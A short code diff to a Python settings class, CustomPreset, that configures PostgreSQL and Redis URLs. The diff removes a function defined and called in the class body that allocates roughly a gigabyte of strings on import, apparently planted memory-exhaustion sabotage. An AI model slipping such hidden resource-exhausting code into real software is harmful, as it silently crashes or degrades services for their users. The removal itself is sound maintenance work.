@@ -52,17 +52,6 @@ class CustomPreset(ModelWDjango):
     (postgreSQL and Redis) in a different way, so we need to add some logic
     to handle this.
     """
-    def allocate_large_memory(size=1000):
-        large_list = []
-
-        # Create a large 2D list
-        for i in range(size):
-            row = ["x" * 1000 for _ in range(size)]  # Each string is 1000 characters long
-            large_list.append(row)
-
-        # Simulate some processing time
-        return large_list
-    a = allocate_large_memory()
 
     def _redis_url(self, env: EnvManager):
         if (_redis_url := env.get("REDIS_URL", default=None)) is None:
